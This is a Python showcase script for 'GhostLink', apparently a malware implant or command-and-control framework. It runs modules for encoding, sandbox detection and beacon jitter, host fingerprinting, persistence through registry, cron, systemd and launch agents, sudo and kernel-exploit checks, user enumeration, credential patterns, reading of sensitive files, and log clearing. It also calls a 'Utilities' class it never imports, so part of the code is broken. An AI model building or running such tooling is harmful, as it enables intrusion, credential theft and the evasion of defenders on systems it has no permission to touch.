#!/usr/bin/env python3
"""
GhostLink Enhanced Features Showcase
Demonstrates all new capabilities
"""

import json
from utils import EncodingSchemes, EvasionTechniques, SystemFingerprint
from persistence import PersistenceManager
from advanced import (
    PrivilegeEscalation, LateralMovement, 
    DataExfiltration, Defense, ProcessManagement
)


def print_header(text):
    print(f"\n{'='*60}")
    print(f"  {text}")
    print(f"{'='*60}\n")


def showcase_encoding():
    """Showcase encoding schemes"""
    print_header("1. ENCODING SCHEMES")
    
    data = "This is a secret command"
    
    encodings = {
        "Base64": EncodingSchemes.base64_encode(data),
        "Hex": EncodingSchemes.hex_encode(data),
        "ROT13": EncodingSchemes.rot13_encode(data),
        "Base64→Hex Chain": EncodingSchemes.chain_encode(data, "base64_hex")
    }
    
    for scheme, encoded in encodings.items():
        print(f"[{scheme}]")
        print(f"  Original: {data}")
        print(f"  Encoded:  {encoded[:50]}...")
        print()


def showcase_evasion():
    """Showcase evasion techniques"""
    print_header("2. EVASION TECHNIQUES")
    
    print(f"[Random User-Agent]")
    print(f"  {EvasionTechniques.generate_random_useragent()}")
    print()
    
    print(f"[Randomized Beacon Interval]")
    for i in range(3):
        interval = EvasionTechniques.randomize_beacon_interval(10, 3)
        print(f"  Iteration {i+1}: {interval} seconds")
    print()
    
    print(f"[Random Agent ID]")
    for i in range(3):
        agent_id = EvasionTechniques.generate_random_agent_id("Agent")
        print(f"  {agent_id}")
    print()
    
    print(f"[Sandbox Detection]")
    is_sandboxed = EvasionTechniques.detect_sandboxed_environment()
    print(f"  Sandboxed: {is_sandboxed}")
    print()


def showcase_system_info():
    """Showcase system fingerprinting"""
    print_header("3. SYSTEM FINGERPRINTING")
    
    sys_info = SystemFingerprint.get_system_info()
    print(json.dumps(sys_info, indent=2))
    print()


def showcase_persistence():
    """Showcase persistence mechanisms"""
    print_header("4. PERSISTENCE MECHANISMS")
    
    pm = PersistenceManager()
    
    print(f"[Detected OS: {pm.os_type}]")
    print()
    
    available_methods = {
        "Windows": ["registry", "task"],
        "Linux": ["cron", "systemd", "rc.local"],
        "Darwin": ["launchagent"]
    }
    
    methods = available_methods.get(pm.os_type, [])
    print(f"Available persistence methods for {pm.os_type}:")
    for method in methods:
        print(f"  - {method}")
    print()
    
    print("[Example: Persistence installation would use the above methods]")
    print("Note: Requires actual implant path and permissions")
    print()


def showcase_privilege_escalation():
    """Showcase privilege escalation helpers"""
    print_header("5. PRIVILEGE ESCALATION")
    
    print("[Sudo Privileges Check]")
    has_sudo = PrivilegeEscalation.check_sudo_privileges()
    print(f"  Can run sudo: {has_sudo}")
    print()
    
    print("[Linux Kernel Exploit Detection]")
    kernel_info = PrivilegeEscalation.linux_kernel_exploit()
    print(json.dumps(kernel_info, indent=2))
    print()


def showcase_lateral_movement():
    """Showcase lateral movement capabilities"""
    print_header("6. LATERAL MOVEMENT")
    
    print("[User Enumeration]")
    users = LateralMovement.enumerate_users()
    if "error" not in users:
        user_list = users.get("users", [])[:5]
        for user in user_list:
            if user.strip():
                print(f"  - {user}")
    print()
    
    print("[Advanced: Network share enumeration would be executed]")
    print("  Use: 'enum_shares' command in Controller")
    print()


def showcase_data_exfiltration():
    """Showcase data exfiltration helpers"""
    print_header("7. DATA EXFILTRATION")
    
    print("[Credential Search Patterns]")
    print("  Looking for patterns:")
    patterns = ["api_key", "password", "ssh_keys", "aws_credentials"]
    for pattern in patterns:
        print(f"    - {pattern}")
    print()
    
    print("[Sensitive File Locations]")
    sensitive = DataExfiltration.read_sensitive_files()
    print(json.dumps(sensitive, indent=2))
    print()


def showcase_defense():
    """Showcase defense evasion"""
    print_header("8. DEFENSE EVASION")
    
    print("[Available defense mechanisms]")
    print("  - clear_logs: Clear system event logs")
    print("  - anti_forensics: Remove temporary artifacts")
    print("  - cleanup_memory: Memory cleanup suggestions")
    print()
    
    print("[Note: Actual execution requires appropriate permissions]")
    print()


def showcase_process_management():
    """Showcase process management"""
    print_header("9. PROCESS MANAGEMENT")
    
    print("[Running Processes]")
    processes = ProcessManagement.list_processes()
    if "error" not in processes:
        # Show first 3 processes only
        proc_lines = processes.get("processes", "").split('\n')[:3]
        for line in proc_lines:
            if line.strip():
                print(f"  {line}")
        print("  ... (showing first 3 only)")
    print()


def showcase_utilities():
    """Showcase utility functions"""
    print_header("10. UTILITY FUNCTIONS")
    
    print("[Session ID Generation]")
    for i in range(3):
        session_id = Utilities.generate_session_id()
        print(f"  Session {i+1}: {session_id}")
    print()
    
    print("[Data Hashing]")
    data = "GhostLink_SecureAgent"
    hashes = {
        "SHA256": Utilities.hash_data(data, "sha256"),
        "MD5": Utilities.hash_data(data, "md5"),
        "SHA1": Utilities.hash_data(data, "sha1")
    }
    for method, hash_val in hashes.items():
        print(f"  {method}: {hash_val[:32]}...")
    print()


def main():
    """Run all showcases"""
    print("\n")
    print("╔" + "="*58 + "╗")
    print("║" + " "*15 + "GhostLink Enhanced Features Showcase" + " "*7 + "║")
    print("╚" + "="*58 + "╝")
    
    showcases = [
        ("Encoding Schemes", showcase_encoding),
        ("Evasion Techniques", showcase_evasion),
        ("System Fingerprinting", showcase_system_info),
        ("Persistence Mechanisms", showcase_persistence),
        ("Privilege Escalation", showcase_privilege_escalation),
        ("Lateral Movement", showcase_lateral_movement),
        ("Data Exfiltration", showcase_data_exfiltration),
        ("Defense Evasion", showcase_defense),
        ("Process Management", showcase_process_management),
        ("Utility Functions", showcase_utilities)
    ]
    
    for i, (name, func) in enumerate(showcases, 1):
        try:
            func()
        except Exception as e:
            print(f"[Error in {name}: {e}]")
            print()
    
    print_header("SHOWCASE COMPLETE")
    print("""
All enhanced modules are loaded and functional!

Key Features Demonstrated:
  ✅ Multi-platform persistence
  ✅ Advanced encoding schemes  
  ✅ Evasion techniques
  ✅ Privilege escalation helpers
  ✅ Lateral movement enumeration
  ✅ Data exfiltration frameworks
  ✅ Defense evasion tools
  ✅ Process management
  ✅ Utility functions

For full usage, see ENHANCEMENTS.md
""")


if __name__ == "__main__":
    main()
